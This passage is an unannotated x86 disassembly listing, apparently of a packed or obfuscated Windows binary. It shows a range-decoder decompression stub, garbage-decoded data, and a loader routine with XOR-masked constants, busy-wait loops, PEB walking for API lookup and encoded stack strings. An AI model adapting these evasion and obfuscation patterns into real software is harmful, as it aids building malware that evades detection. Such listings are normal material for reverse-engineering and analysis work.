  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
